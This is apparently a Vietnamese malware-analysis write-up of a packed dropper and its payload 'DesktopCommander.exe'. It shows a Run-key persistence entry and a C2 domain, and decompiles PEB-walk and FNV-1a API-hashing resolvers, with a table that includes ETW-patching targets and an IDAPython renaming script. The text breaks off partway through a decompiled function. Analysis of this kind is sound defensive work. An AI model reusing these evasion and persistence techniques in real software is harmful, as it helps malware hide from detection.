![](../../../../image/Pasted%20image%2020261018195836.png)
**Phân tích sơ bộ.**
![](../../../../image/Pasted%20image%2020261018201428.png)
DiE nhận diện malware có dấu hiệu bị packed.
![](../../../../image/Pasted%20image%2020261018201529.png)
Bảng import cũng cho thấy dấu hiệu bị packed, không tìm thấy thư viện mạng, các API trong `KERNEL32.DLL` cũng không đầy đủ với 1 malware cơ bản.
![](../../../../image/Pasted%20image%2020261018204059.png)
Về string, cũng không có nhiều thứ đáng nói, ở đây ta tìm được 1 chuỗi `DesktopCommander.exe`.
![](../../../../image/Pasted%20image%2020261018201906.png)
Malware có 1 section lạ `.00cfg`, có thể đây là section chứa packed data.
**Chạy thử malware.**
Cái đầu tiên ta có thể thấy, malware chạy và tự thoát.
![](../../../../image/Pasted%20image%2020261018203047.png)
Log procmon, ta thấy nó tạo 1 tiến trình khác, ngoài ra không có gì quá nổi bật. Thử filter với chuỗi `DesktopCommander.exe`.
![](../../../../image/Pasted%20image%2020261018212741.png)
Đúng như dự đoán, tiến trình tên `DesktopCommander.exe` thực sự tồn tại. Ngoài ra, theo procexp, tiến trình này chạy ngầm liên tục chứ không tự thoát giống như `sample.exe`. Hành vi này cho thấy, `sample.exe` thực chất chỉ là dropper, còn toàn bộ logic của malware nằm tập trung ở `DesktopCommander.exe`. Từ procexp, ta có thể tìm được image file của malware.
![](../../../../image/Pasted%20image%2020261018213745.png)
![](../../../../image/Pasted%20image%2020261018213702.png)
Tuy nhiên, file này thực sự đã bị packed, dấu hiệu rất rõ ràng.
```
HKU\S-1-5-21-960305980-886282949-750445721-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\DesktopCommander Update: ""C:\Users\lethi\AppData\Roaming\DesktopCommander\DesktopCommander.exe""
```
Trong log regshot, tìm được 1 event thêm value vào key `RUN`. Đây chắc chắn là cơ chế persistence của malware.
![](../../../../image/Pasted%20image%2020261018203612.png)
Về mạng, ta thây nó thực hiện truy vấn DNS để tìm IP của host `strata-victor.ddns.net`. Tiếp theo, nó thực hiện kết nối TCP đến host đó.
![](../../../../image/Pasted%20image%2020261018203827.png)
**Reverse**
Trước tiên, phân tích logic của `sample.exe` bằng IDA. Vì `sample.exe` chỉ là dropper, logic chính nằm trong `DesktopCommander.exe`, nên ta chỉ phân tích các hàm nổi bật của chương trình.
```c
struct _LIST_ENTRY *__fastcall sub_1400035DA(__int64 a1)
{
  struct _PEB_LDR_DATA *Ldr; // r8
  struct _LIST_ENTRY *Flink; // rdx
  struct _LIST_ENTRY *p_InMemoryOrderModuleList; // r8
  struct _LIST_ENTRY *result; // rax
  struct _LIST_ENTRY *v5; // r10
  unsigned __int64 Blink_low; // r11
  __int64 v7; // rsi
  unsigned __int64 i; // rdi
  char v9; // bl
  unsigned __int8 v10; // bp

  Ldr = NtCurrentPeb()->Ldr;
  Flink = Ldr->InMemoryOrderModuleList.Flink;
  p_InMemoryOrderModuleList = &Ldr->InMemoryOrderModuleList;
  result = nullptr;
  if ( Flink != p_InMemoryOrderModuleList )
  {
    while ( 1 )
    {
      v5 = Flink[5].Flink;
      if ( v5 != nullptr )
      {
        Blink_low = LOWORD(Flink[4].Blink);
        if ( (unsigned __int16)(Blink_low - 1) < 0x40u )
        {
          v7 = 0xA466428EA920B904uLL;
          for ( i = 0; i < Blink_low; i += 2LL )
          {
            v9 = *((_BYTE *)&v5->Flink + i);
            v10 = v9 + 32;
            if ( (unsigned __int8)(v9 - 65) >= 0x1Au )
              v10 = *((_BYTE *)&v5->Flink + i);
            v7 = 0x100000001B3LL * (v10 ^ (unsigned __int64)v7);
          }
          if ( v7 == a1 )
            break;
        }
      }
      Flink = Flink->Flink;
      if ( Flink == p_InMemoryOrderModuleList )
        return result;
    }
    return Flink[2].Flink;
  }
  return result;
}
```
Hàm duyệt `PEB->Ldr->InMemoryOrderModuleList`, băm tên từng DLL (chuyển chữ thường, FNV-1a 64-bit với seed tùy biến `0xA466428EA920B904`) và trả về `DllBase` của DLL có hash khớp tham số, không khớp thì trả `NULL`. Cơ chế này có ghi chép gần giống trong chương 19 PMA.
```c
char *__fastcall GetProcByHash(struct _LIST_ENTRY *a1, __int64 a2)
{
  char *v2; // r8
  __int64 v3; // r10
  __int64 v4; // rax
  char *v5; // rsi
  char *v6; // r10
  __int64 v7; // r15
  __int64 v8; // r13
  __int64 v9; // r12
  unsigned __int8 v10; // bp
  unsigned __int8 *v11; // r13
  unsigned __int8 v12; // r8
  __int64 v13; // rdx
  char *v14; // rsi
  char *v15; // r15
  __int64 i; // r12
  __int64 v17; // rdi
  __int64 j; // rax
  char v19; // cl
  unsigned __int8 v20; // dl
  __int64 v21; // rcx
  __int64 k; // rax
  __int64 v23; // rdx
  struct _LIST_ENTRY *ModuleByHash; // rax
  char m; // al
  unsigned __int8 v26; // r8
  int v28; // [rsp+24h] [rbp-44h]

LABEL_1:
  v2 = (char *)a1 + SHIDWORD(a1[3].Blink);
  v3 = 16 * (unsigned int)(*((_WORD *)v2 + 12) == 523);
  v4 = *(unsigned int *)&v2[v3 + 120];
  if ( *(_DWORD *)&v2[v3 + 120] == 0 || *(_DWORD *)((char *)&a1[1].Blink + v4) == 0 )
    return nullptr;
  v28 = *(_DWORD *)&v2[v3 + 124];
  v5 = (char *)a1 + *(unsigned int *)((char *)&a1[2].Flink + v4 + 4);
  v6 = (char *)a1 + *(unsigned int *)((char *)&a1[1].Blink + v4 + 4);
  v7 = 0;
  while ( 1 )
  {
    v8 = *(unsigned int *)((char *)&a1->Flink + 4 * v7 + *(unsigned int *)((char *)&a1[2].Flink + v4));
    v9 = 0xA466428EA920B904uLL;
    v10 = *((_BYTE *)&a1->Flink + v8);
    if ( v10 != 0 )
    {
      v11 = (unsigned __int8 *)&a1->Flink + v8 + 1;
      do
      {
        v12 = v10 + 32;
        if ( (unsigned __int8)(v10 - 65) >= 0x1Au )
          v12 = v10;
        v9 = 0x100000001B3LL * (v12 ^ (unsigned __int64)v9);
        v10 = *v11++;
      }
      while ( v10 != 0 );
    }
    if ( v9 == a2 )
      break;
    if ( ++v7 == *(_DWORD *)((char *)&a1[1].Blink + v4) )
      return nullptr;
  }
  v13 = *(unsigned int *)&v6[4 * *(unsigned __int16 *)&v5[2 * v7]];
  if ( *(_DWORD *)&v6[4 * *(unsigned __int16 *)&v5[2 * v7]] == 0 )
    return nullptr;
  v14 = (char *)a1 + v13;
  if ( (unsigned int)v13 >= (unsigned int)v4 && (unsigned int)v13 < (int)v4 + v28 )
  {
    v15 = (char *)&a1->Flink + v13 + 2;
    for ( i = 0; v14[i] != 0; ++i )
    {
      if ( v14[i] == 46 )
      {
        v17 = 0xA466428EA920B904uLL;
        if ( i != 0 )
        {
          for ( j = 0; j != i; ++j )
          {
            v19 = v14[j];
            v20 = v19 + 32;
            if ( (unsigned __int8)(v19 - 65) >= 0x1Au )
              v20 = v14[j];
            v17 = 0x100000001B3LL * (v20 ^ (unsigned __int64)v17);
          }
        }
        v21 = v17;
        for ( k = 0; k != 4; ++k )
        {
          v23 = (unsigned __int8)aDlllocalappdat[k];
          v21 = 0x100000001B3LL * (v23 ^ v21);
        }
        ModuleByHash = GetModuleByHash(a1: v21);
        if ( ModuleByHash != nullptr || (ModuleByHash = GetModuleByHash(a1: v17)) != nullptr )
        {
          a1 = ModuleByHash;
          a2 = 0xA466428EA920B904uLL;
          for ( m = v14[i + 1]; m != 0; m = *v15++ )
          {
            v26 = m + 32;
            if ( (unsigned __int8)(m - 65) >= 0x1Au )
              v26 = m;
            a2 = 0x100000001B3LL * (v26 ^ (unsigned __int64)a2);
          }
          goto LABEL_1;
        }
        return nullptr;
      }
      ++v15;
    }
    return nullptr;
  }
  return v14;
}
```
Tương tự hàm trên, hàm này dùng để lấy địa chỉ của API dựa trên hash, chương 19 PMA cũng đã có ghi chép.
Đặt bp và debug động, ta rút ra được danh sách các API tương ứng với hash như sau.

|#|Hash|Module|Tên|Mã exit nếu lỗi|
|---|---|---|---|---|
|1|`0x007891CA27E9F4EE`|—|kernel32.dll|1|
|2|`0x091B31126432C6B4`|—|ntdll.dll|1|
|3|`0x891601300EE9E74E`|—|kernelbase.dll (không có thì dùng kernel32)|—|
|4|`0x110F66D32701C8BE`|kernel32|GetModuleFileNameW|31|
|5|`0xF2918DBBAC48FB1E`|kernel32|GetTempPathW|32|
|6|`0x1EADD0D85F3A9A63`|kernel32|CreateFileW|33|
|7|`0x4A457E6CB33278AE`|kernel32|ReadFile|34|
|8|`0x40F99E1E6CC3980D`|kernel32|WriteFile|35|
|9|`0x7F04DD6D0996F82E`|kernel32|CloseHandle|36|
|10|`0xB49CE2CEA96CCDE2`|kernel32|DeleteFileW|37|
|11|`0x45ECEB7237161E6A`|kernel32|GetFileSizeEx|38|
|12|`0x9AA2090823EB7C6E`|kernel32|CreateProcessW|39|
|13|`0xB804B1BDA4207FFB`|kernel32|WaitForSingleObject|40|
|14|`0xB4B429EC901DFD3A`|kernel32|GetExitCodeProcess|41|
|15|`0x7DB7E39CE6FC266C`|kernel32|GetCommandLineW|42|
|16|`0x845FEFC85141C3F9`|kernel32 → kernelbase|OpenProcess|43|
|17|`0x7E4C2837E94925DC`|kernel32 → kernelbase|CreateToolhelp32Snapshot|44|
|18|`0x8C4A6ECD1D730777`|kernel32 → kernelbase|Process32FirstW|45|
|19|`0xAF8C5CB639651D7E`|kernel32 → kernelbase|Process32NextW|46|
|20|`0x47C5F8A81C7219FA`|kernel32 → kernelbase|InitializeProcThreadAttributeList|47|
|21|`0xB1652A33D7BB5BAF`|kernel32 → kernelbase|UpdateProcThreadAttribute|48|
|22|`0x6E725DD5532C4681`|kernel32 → kernelbase|DeleteProcThreadAttributeList|49|
|23|`0xEA6C7A3147903D0B`|kernel32 → kernelbase|GlobalMemoryStatusEx|50|
|24|`0x15BC2DA339AFF299`|kernel32 → kernelbase|GetSystemInfo|51|
|25|`0xA15BC5CE20682CCB`|kernel32 → kernelbase|GetModuleHandleW|52|
|26|`0x45CD07A7E8F6290A`|kernel32 → kernelbase|GetEnvironmentVariableW|53|
|27|`0xF411A1AB6F73369C`|kernel32|VirtualAlloc|(không bắt buộc)|
|28|`0x48F0091B95462B76`|kernel32|VirtualProtect|(không bắt buộc)|
|29|`0xCB6CAE80A6AA7107`|ntdll|NtAllocateVirtualMemory|(không bắt buộc)|
|30|`0x7AFFE753E3DE2E0F`|ntdll|NtProtectVirtualMemory|(không bắt buộc)|
|31|`0x90680B2D7DD3D3E9`|ntdll|NtQueryInformationProcess|(không bắt buộc)|
|32|`0x268767D23C46C108`|ntdll|NtSetInformationThread|(không bắt buộc)|
|33|`0xD1C4498B25D4276D`|ntdll|**EtwEventWrite**|patch|
|34|`0x430052FA5F47EC24`|ntdll|**EtwEventWriteFull**|patch|
|35|`0x16723849E96223F1`|ntdll|**NtTraceEvent**|patch|
Đến đây, để code dễ đọc, nhờ AI viết hộ 1 cái script IDAPython để rename các con trỏ hàm thành đúng tên.
```python
# -*- coding: utf-8 -*-
"""
Auto-rename API-hash-resolved variables  —  sample.exe (FNV-1a 64-bit, PEB walk)

Dung trong IDA:  File -> Script file...  -> chon file nay
Khong can sua dia chi gi ca: script tu quet IDB tim hash.
"""

import idc, idaapi, idautils, ida_hexrays, ida_name

MASK = 0xFFFFFFFFFFFFFFFF

# ══════════════════════════════════════════════════════════════════════════
#  Hash -> ten
# ══════════════════════════════════════════════════════════════════════════
HASH_MAP = {
    0x007891CA27E9F4EE: "kernel32",
    0x091B31126432C6B4: "ntdll",
    0x891601300EE9E74E: "kernelbase",
    0x110F66D32701C8BE: "GetModuleFileNameW",
    0xF2918DBBAC48FB1E: "GetTempPathW",
    0x1EADD0D85F3A9A63: "CreateFileW",
    0x4A457E6CB33278AE: "ReadFile",
    0x40F99E1E6CC3980D: "WriteFile",
    0x7F04DD6D0996F82E: "CloseHandle",
    0xB49CE2CEA96CCDE2: "DeleteFileW",
    0x45ECEB7237161E6A: "GetFileSizeEx",
    0x9AA2090823EB7C6E: "CreateProcessW",
    0xB804B1BDA4207FFB: "WaitForSingleObject",
    0xB4B429EC901DFD3A: "GetExitCodeProcess",
    0x7DB7E39CE6FC266C: "GetCommandLineW",
    0x845FEFC85141C3F9: "OpenProcess",
    0x7E4C2837E94925DC: "CreateToolhelp32Snapshot",
    0x8C4A6ECD1D730777: "Process32FirstW",
    0xAF8C5CB639651D7E: "Process32NextW",
    0x47C5F8A81C7219FA: "InitializeProcThreadAttributeList",
    0xB1652A33D7BB5BAF: "UpdateProcThreadAttribute",
    0x6E725DD5532C4681: "DeleteProcThreadAttributeList",
    0xEA6C7A3147903D0B: "GlobalMemoryStatusEx",
    0x15BC2DA339AFF299: "GetSystemInfo",
    0xA15BC5CE20682CCB: "GetModuleHandleW",
    0x45CD07A7E8F6290A: "GetEnvironmentVariableW",
    0xF411A1AB6F73369C: "VirtualAlloc",
    0x48F0091B95462B76: "VirtualProtect",
    0xCB6CAE80A6AA7107: "NtAllocateVirtualMemory",
    0x7AFFE753E3DE2E0F: "NtProtectVirtualMemory",
    0x90680B2D7DD3D3E9: "NtQueryInformationProcess",
    0x268767D23C46C108: "NtSetInformationThread",
    0xD1C4498B25D4276D: "EtwEventWrite",
    0x430052FA5F47EC24: "EtwEventWriteFull",
    0x16723849E96223F1: "NtTraceEvent",
}
DLL_HASHES = {0x007891CA27E9F4EE, 0x091B31126432C6B4, 0x891601300EE9E74E}


# ══════════════════════════════════════════════════════════════════════════
#  Helper: truy cap SWIG container an toan (IDA 7.x / 8.x / 9.x khac nhau)
# ══════════════════════════════════════════════════════════════════════════
def vec_len(v):
    try:
        return len(v)
    except Exception:
        pass
    try:
        return v.size()
    except Exception:
        pass
    return 0


def num_value(e):
    """Lay gia tri cua mot cot_num, thu nhieu cach."""
    try:
        return e.numval() & MASK
    except Exception:
        pass
    try:
        return e.n._value & MASK
    except Exception:
        pass
    try:
        return e.n.value(e.type) & MASK
    except Exception:
        pass
    return None


def unwrap(e):
    """Boc cac lop cast de lay bieu thuc goc."""
    try:
        while e.op == ida_hexrays.cot_cast:
            e = e.x
    except Exception:
        pass
    return e


# ══════════════════════════════════════════════════════════════════════════
#  Visitor
# ══════════════════════════════════════════════════════════════════════════
class HashVisitor(ida_hexrays.ctree_visitor_t):
    def __init__(self, cfunc):
        super().__init__(ida_hexrays.CV_FAST)
        self.cfunc     = cfunc
        self.hash_hits = {}    # lvar_idx -> ten API
        self.copies    = []    # (dst_idx, src_idx)  cho pattern  v8 = v7
        self.n_calls   = 0     # so luong  lvar = call(...)  nhin thay
        self.errors    = []

    def visit_expr(self, e):
        try:
            self._visit(e)
        except Exception as ex:
            if len(self.errors) < 5:
                self.errors.append(repr(ex))
        return 0

    def _visit(self, e):
        if e.op != ida_hexrays.cot_asg:
            return
        lhs = e.x
        rhs = unwrap(e.y)
        if lhs.op != ida_hexrays.cot_var:
            return

        # --- pattern 2:  v8 = v7   (copy bien tam sang bien ben) ---
        if rhs.op == ida_hexrays.cot_var:
            self.copies.append((lhs.v.idx, rhs.v.idx))
            return

        # --- pattern 1:  v = Resolver(..., hash, ...) ---
        if rhs.op != ida_hexrays.cot_call:
            return
        self.n_calls += 1

        n = vec_len(rhs.a)
        for i in range(n):
            try:
                arg = unwrap(rhs.a[i])
            except Exception:
                break
            if arg.op != ida_hexrays.cot_num:
                continue
            val = num_value(arg)
            if val is not None and val in HASH_MAP:
                pfx = "hmod_" if val in DLL_HASHES else "pfn_"
                self.hash_hits[lhs.v.idx] = pfx + HASH_MAP[val]
                return


# ══════════════════════════════════════════════════════════════════════════
#  Xu ly mot ham
# ══════════════════════════════════════════════════════════════════════════
def process_func(func_ea):
    fname = idc.get_func_name(func_ea)
    print("\n--- %s (%#x) ---" % (fname, func_ea))

    try:
        cfunc = ida_hexrays.decompile(func_ea)
    except Exception as ex:
        print("  [!] decompile that bai: %s" % ex)
        return 0
    if cfunc is None:
        print("  [!] decompile tra ve None")
        return 0

    v = HashVisitor(cfunc)
    v.apply_to(cfunc.body, None)

    if v.errors:
        print("  [!] loi trong visitor: %s" % "; ".join(v.errors))

    print("  [*] %d loi goi 'bien = call(...)', %d khop hash, %d phep copy"
          % (v.n_calls, len(v.hash_hits), len(v.copies)))

    if not v.hash_hits:
        return 0

    lvars = cfunc.get_lvars()
    final = dict(v.hash_hits)

    # Lan truyen ten qua pattern  v8 = v7  : bien ben lay ten chinh,
    # bien tam duoc gan hau to _tmp
    for dst, src in v.copies:
        if src in final and dst not in final:
            final[dst] = final[src]
            final[src] = final[src] + "_tmp"

    # Gom (ten_cu -> ten_moi), tranh trung ten trong cung ham
    pairs, used = [], set()
    for idx, new_name in final.items():
        try:
            old_name = lvars[idx].name
        except Exception:
            continue
        base, n = new_name, 2
        while new_name in used:
            new_name = "%s_%d" % (base, n)
            n += 1
        used.add(new_name)
        if old_name != new_name:
            pairs.append((old_name, new_name))

    count = 0
    for old_name, new_name in pairs:
        ok = False
        try:
            ok = ida_hexrays.rename_lvar(func_ea, old_name, new_name)
        except Exception as ex:
            print("  [!] rename_lvar(%s): %s" % (old_name, ex))
        print("  %s %-24s -> %s" % ("[+]" if ok else "[!]", old_name, new_name))
        if ok:
            count += 1

    if count:
        ida_hexrays.mark_cfunc_dirty(func_ea)
    return count


# ══════════════════════════════════════════════════════════════════════════
#  Buoc 1: quet IDB tim ham co chua hash  (khong hardcode dia chi)
# ══════════════════════════════════════════════════════════════════════════
def find_candidates():
    found = set()
    for seg in idautils.Segments():
        end = idc.get_segm_end(seg)
        for head in idautils.Heads(seg, end):
            if not idc.is_code(idc.get_full_flags(head)):
                continue
            for oi in range(3):
                if idc.get_operand_type(head, oi) != idc.o_imm:
                    continue
                if (idc.get_operand_value(head, oi) & MASK) in HASH_MAP:
                    f = idaapi.get_func(head)
                    if f:
                        found.add(f.start_ea)
                    break
    return found


# ══════════════════════════════════════════════════════════════════════════
#  Main
# ══════════════════════════════════════════════════════════════════════════
def main():
    if not ida_hexrays.init_hexrays_plugin():
        print("[!] Hex-Rays khong kha dung")
        return

    cands = find_candidates()
    print("=" * 70)
    print("[*] Tim thay %d ham co chua hash" % len(cands))
    if not cands:
        print("[!] Khong co hash nao trong IDB - kiem tra lai HASH_MAP")
        return

    total = 0
    for fea in sorted(cands):
        total += process_func(fea)

    print("\n" + "=" * 70)
    print("=== Xong: %d bien da doi ten trong %d ham ===" % (total, len(cands)))
    print("Mo lai cua so Pseudocode (F5) de thay ket qua.")


main()
```
Sau khi đổi tên thì code sẽ như này.
```c
void __noreturn sub_7FF603D614E9()
{
  struct _LIST_ENTRY *hmod_kernel32; // rdi
  struct _LIST_ENTRY *ModuleByHash; // rax
  struct _LIST_ENTRY *hmod_ntdll; // r15
  struct _LIST_ENTRY *hmod_kernelbase; // rsi
  char *pfn_GetModuleFileNameW_tmp; // rax
  UINT v5; // ecx
  char *pfn_GetModuleFileNameW; // rbx
  char *ProcByHash; // rax
  char *pfn_GetTempPathW; // rbp
  char *pfn_CreateFileW_tmp; // rax
  char *pfn_CreateFileW; // r12
  char *pfn_ReadFile_tmp; // rax
  char *pfn_ReadFile; // r14
  char *pfn_WriteFile_tmp; // rax
  char *pfn_WriteFile; // r13
  char *pfn_CloseHandle_tmp; // rax
  char *pfn_DeleteFileW_tmp; // rax
  char *pfn_GetFileSizeEx_tmp; // rax
  char *pfn_CreateProcessW_tmp; // rax
  char *pfn_WaitForSingleObject_tmp; // rax
  char *pfn_GetExitCodeProcess_tmp; // rax
  char *pfn_NtAllocateVirtualMemory; // rdi
  char *pfn_EtwEventWrite_tmp; // rax
  char *pfn_EtwEventWrite; // rsi
  char *pfn_EtwEventWriteFull_tmp; // rax
  char *pfn_EtwEventWriteFull; // rsi
  char *pfn_NtTraceEvent_tmp; // rax
  char *pfn_NtTraceEvent; // rsi
  int v28; // esi
  int v29; // edx
  char v30; // al
  int v31; // edx
  __int64 v32; // rax
  char *v33; // rsi
  struct _PEB *v34; // rax
  __int64 v35; // rax
  __int64 v36; // rbx
  __int64 i3; // rsi
  __int64 v38; // rax
  unsigned __int64 v39; // rcx
  __int64 i4; // rdx
  unsigned __int64 v41; // rax
  unsigned __int64 v42; // rcx
  __int64 v43; // r8
  unsigned __int64 v44; // rax
  __int64 v45; // rax
  __int64 v46; // rdi
  signed __int64 v47; // r8
  unsigned __int64 i; // r15
  __int64 v49; // r8
  unsigned __int64 v50; // r14
  __int64 v51; // rax
  __int64 j; // rcx
  unsigned __int64 v53; // rbx
  __int64 k; // rdx
  bool v55; // cf
  __int64 v56; // rax
  int (__fastcall *v57)(__int64, _QWORD *, _QWORD); // rdi
  __int64 v58; // rax
  __int64 v59; // rdx
  __int64 v60; // rcx
  __int64 v61; // rdx
  __int64 v62; // r8
  WCHAR v63; // r9
  WCHAR v64; // r11
  __int64 v65; // rsi
  unsigned __int64 v66; // r14
  __int64 v67; // rcx
  __int64 m; // rdx
  __int64 v69; // rsi
  unsigned __int64 v70; // rax
  __int64 v71; // rdi
  unsigned __int64 v72; // rsi
  __int64 n; // rax
  unsigned int v74; // eax
  __int64 v75; // r14
  __int64 v76; // rbp
  __int64 ii; // rdx
  __int64 v78; // rcx
  __int64 v79; // r9
  unsigned int v80; // eax
  unsigned __int64 v81; // r8
  __int16 *v82; // r10
  __int64 jj; // rax
  __int64 v84; // r11
  __int64 kk; // rcx
  __int64 v86; // rdx
  __int16 v87; // ax
  __int64 v88; // r8
  __int64 v89; // rax
  __int64 v90; // rcx
  __int64 mm; // rdx
  __int64 v92; // rax
  __int64 v93; // rdi
  __int16 v94; // ax
  __int64 nn; // rdi
  unsigned __int64 v96; // rbx
  __int64 v97; // rax
  __int64 i1; // rcx
  int v99; // edx
  __int64 v100; // rdx
  int v101; // r8d
  __int64 v102; // rdx
  __int16 *i2; // rdx
  unsigned __int64 v104; // rdi
  __int16 v105; // ax
  char *pfn_GetModuleHandleW; // [rsp+58h] [rbp-480h]
  int (__fastcall *v107)(__int64, _QWORD *, _QWORD); // [rsp+58h] [rbp-480h]
  _BYTE *v108; // [rsp+58h] [rbp-480h]
  char *pfn_VirtualProtect; // [rsp+60h] [rbp-478h]
  char *pfn_GlobalMemoryStatusEx; // [rsp+68h] [rbp-470h]
  int v111; // [rsp+68h] [rbp-470h]
  unsigned __int64 v112; // [rsp+68h] [rbp-470h]
  __int64 v113; // [rsp+68h] [rbp-470h]
  char *pfn_GetFileSizeEx; // [rsp+70h] [rbp-468h]
  unsigned __int64 v115; // [rsp+70h] [rbp-468h]
  unsigned int v116; // [rsp+70h] [rbp-468h]
  char *pfn_GetSystemInfo; // [rsp+78h] [rbp-460h]
  int v118; // [rsp+78h] [rbp-460h]
  unsigned __int64 v119; // [rsp+78h] [rbp-460h]
  char *pfn_CloseHandle; // [rsp+80h] [rbp-458h]
  char v121; // [rsp+88h] [rbp-450h]
  UINT v122; // [rsp+8Ch] [rbp-44Ch] BYREF
  char *pfn_VirtualAlloc; // [rsp+90h] [rbp-448h]
  _DWORD v124[2]; // [rsp+98h] [rbp-440h] BYREF
  signed __int64 v125; // [rsp+A0h] [rbp-438h] BYREF
  char *pfn_NtQueryInformationProcess; // [rsp+A8h] [rbp-430h]
  char *pfn_NtProtectVirtualMemory; // [rsp+B0h] [rbp-428h]
  char *pfn_NtSetInformationThread; // [rsp+B8h] [rbp-420h]
  char *pfn_DeleteFileW; // [rsp+C0h] [rbp-418h]
  char *pfn_GetEnvironmentVariableW; // [rsp+C8h] [rbp-410h]
  char *pfn_GetCommandLineW; // [rsp+D0h] [rbp-408h]
  char *pfn_GetExitCodeProcess; // [rsp+D8h] [rbp-400h]
  char *pfn_WaitForSingleObject; // [rsp+E0h] [rbp-3F8h]
  char *pfn_CreateProcessW; // [rsp+E8h] [rbp-3F0h]
  __int64 v135; // [rsp+F0h] [rbp-3E8h]
  int v136; // [rsp+FCh] [rbp-3DCh] BYREF
  WCHAR Buffer[8]; // [rsp+100h] [rbp-3D8h] BYREF
  __int128 v138; // [rsp+110h] [rbp-3C8h]
  __int128 v139; // [rsp+120h] [rbp-3B8h]
  __int128 v140; // [rsp+130h] [rbp-3A8h]
  __int128 v141; // [rsp+140h] [rbp-398h]
  __int128 v142; // [rsp+150h] [rbp-388h]
  __int128 v143; // [rsp+160h] [rbp-378h]
  __int128 v144; // [rsp+170h] [rbp-368h]
  DWORD nSize[8]; // [rsp+180h] [rbp-358h] BYREF
  __int128 v146; // [rsp+1A0h] [rbp-338h] BYREF
  __int128 v147; // [rsp+1B0h] [rbp-328h] BYREF
  _QWORD v148[2]; // [rsp+1C0h] [rbp-318h] BYREF
  __int128 v149; // [rsp+1D0h] [rbp-308h]
  __int128 v150; // [rsp+1E0h] [rbp-2F8h]
  __int128 v151; // [rsp+1F0h] [rbp-2E8h]
  __int128 v152; // [rsp+200h] [rbp-2D8h]
  __int128 v153; // [rsp+210h] [rbp-2C8h]
  char *v154; // [rsp+220h] [rbp-2B8h]
  __int64 v155; // [rsp+228h] [rbp-2B0h]
  char *v156; // [rsp+230h] [rbp-2A8h]
  __int64 v157; // [rsp+238h] [rbp-2A0h]
  char *v158; // [rsp+240h] [rbp-298h]
  __int64 v159; // [rsp+248h] [rbp-290h]
  char *v160; // [rsp+250h] [rbp-288h]
  __int64 v161; // [rsp+258h] [rbp-280h]
  char *v162; // [rsp+260h] [rbp-278h]
  __int64 v163; // [rsp+268h] [rbp-270h]
  __int128 v164; // [rsp+410h] [rbp-C8h] BYREF
  __int128 v165; // [rsp+420h] [rbp-B8h]
  __int128 v166; // [rsp+430h] [rbp-A8h]
  __int128 v167; // [rsp+440h] [rbp-98h] BYREF
  __int128 v168; // [rsp+450h] [rbp-88h]
  __int128 v169; // [rsp+460h] [rbp-78h]
  __int128 v170; // [rsp+470h] [rbp-68h]

  sub_7FF603D63296();
  hmod_kernel32 = GetModuleByHash(a1: 0x7891CA27E9F4EELL);
  *(_QWORD *)&v147 = 0x91B31126432C6B4LL;
  ModuleByHash = GetModuleByHash(a1: 0x91B31126432C6B4LL);
  if ( hmod_kernel32 == nullptr || (hmod_ntdll = ModuleByHash, ModuleByHash == nullptr) )
  {
    v5 = 1;
    goto LABEL_8;
  }
  *(_QWORD *)&v147 = 0x891601300EE9E74EuLL;
  hmod_kernelbase = GetModuleByHash(a1: 0x891601300EE9E74EuLL);
  if ( hmod_kernelbase == nullptr )
    hmod_kernelbase = hmod_kernel32;
  *(_QWORD *)&v147 = 0x110F66D32701C8BELL;
  pfn_GetModuleFileNameW_tmp = GetProcByHash(a1: hmod_kernel32, a2: 0x110F66D32701C8BEuLL);
  if ( pfn_GetModuleFileNameW_tmp == nullptr )
  {
    v5 = 31;
    goto LABEL_8;
  }
  pfn_GetModuleFileNameW = pfn_GetModuleFileNameW_tmp;
  *(_QWORD *)&v147 = 0xF2918DBBAC48FB1EuLL;
  ProcByHash = GetProcByHash(a1: hmod_kernel32, a2: 0xF2918DBBAC48FB1EuLL);
  if ( ProcByHash == nullptr )
  {
    v5 = 32;
    goto LABEL_8;
  }
  pfn_GetTempPathW = ProcByHash;
  *(_QWORD *)&v147 = 0x1EADD0D85F3A9A63LL;
  pfn_CreateFileW_tmp = GetProcByHash(a1: hmod_kernel32, a2: 0x1EADD0D85F3A9A63uLL);
  if ( pfn_CreateFileW_tmp == nullptr )
  {
    v5 = 33;
    goto LABEL_8;
  }
  pfn_CreateFileW = pfn_CreateFileW_tmp;
  *(_QWORD *)&v147 = 0x4A457E6CB33278AELL;
  pfn_ReadFile_tmp = GetProcByHash(a1: hmod_kernel32, a2: 0x4A457E6CB33278AEuLL);
  if ( pfn_ReadFile_tmp == nullptr )
  {
    v5 = 34;
    goto LABEL_8;
  }
  pfn_ReadFile = pfn_ReadFile_tmp;
  *(_QWORD *)&v147 = 0x40F99E1E6CC3980DLL;
  pfn_WriteFile_tmp = GetProcByHash(a1: hmod_kernel32, a2: 0x40F99E1E6CC3980DuLL);
  if ( pfn_WriteFile_tmp == nullptr )
  {
    v5 = 35;
    goto LABEL_8;
  }
  pfn_WriteFile = pfn_WriteFile_tmp;
  *(_QWORD *)&v147 = 0x7F04DD6D0996F82ELL;
  pfn_CloseHandle_tmp = GetProcByHash(a1: hmod_kernel32, a2: 0x7F04DD6D0996F82EuLL);
  if ( pfn_CloseHandle_tmp == nullptr )
  {
    v5 = 36;
    goto LABEL_8;
  }
  pfn_CloseHandle = pfn_CloseHandle_tmp;
  *(_QWORD *)&v147 = 0xB49CE2CEA96CCDE2uLL;
  pfn_DeleteFileW_tmp = GetProcByHash(a1: hmod_kernel32, a2: 0xB49CE2CEA96CCDE2uLL);
  if ( pfn_DeleteFileW_tmp == nullptr )
  {
    v5 = 37;
    goto LABEL_8;
  }
  pfn_DeleteFileW = pfn_DeleteFileW_tmp;
  *(_QWORD *)&v147 = 0x45ECEB7237161E6ALL;
  pfn_GetFileSizeEx_tmp = GetProcByHash(a1: hmod_kernel32, a2: 0x45ECEB7237161E6AuLL);
  if ( pfn_GetFileSizeEx_tmp == nullptr )
  {
    v5 = 38;
    goto LABEL_8;
  }
  pfn_GetFileSizeEx = pfn_GetFileSizeEx_tmp;
  *(_QWORD *)&v147 = 0x9AA2090823EB7C6EuLL;
  pfn_CreateProcessW_tmp = GetProcByHash(a1: hmod_kernel32, a2: 0x9AA2090823EB7C6EuLL);
  if ( pfn_CreateProcessW_tmp == nullptr )
  {
    v5 = 39;
    goto LABEL_8;
  }
  pfn_CreateProcessW = pfn_CreateProcessW_tmp;
  *(_QWORD *)&v147 = 0xB804B1BDA4207FFBuLL;
  pfn_WaitForSingleObject_tmp = GetProcByHash(a1: hmod_kernel32, a2: 0xB804B1BDA4207FFBuLL);
  if ( pfn_WaitForSingleObject_tmp == nullptr )
  {
    v5 = 40;
    goto LABEL_8;
  }
